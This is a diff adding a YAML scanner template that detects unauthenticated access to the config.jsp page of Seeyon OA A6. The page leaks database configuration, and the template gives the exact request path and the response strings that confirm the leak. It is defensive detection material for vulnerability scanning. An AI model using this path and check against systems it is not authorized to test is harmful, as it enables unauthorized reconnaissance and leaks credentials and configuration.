@@ -1,0 +1,28 @@
+id: seeyon-config-exposure
+brief:
+    title: Seeyon OA A6 config.jsp - Information Disclosure
+    by: SleepingBag945
+    level: medium
+    about: The Seeyon OA A6 config.jsp page can be accessed without authorization, resulting in sensitive information leakage vulnerabilities, through which attackers can obtain sensitive information in the s...
+    label:
+        - seeyon
+        - oa
+        - config
+        - info-leak
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/yyoa/ext/trafaxserver/SystemManage/config.jsp'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - DatabaseName=
+            - 请在文本框内配置传真插件所需服务器的信息
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
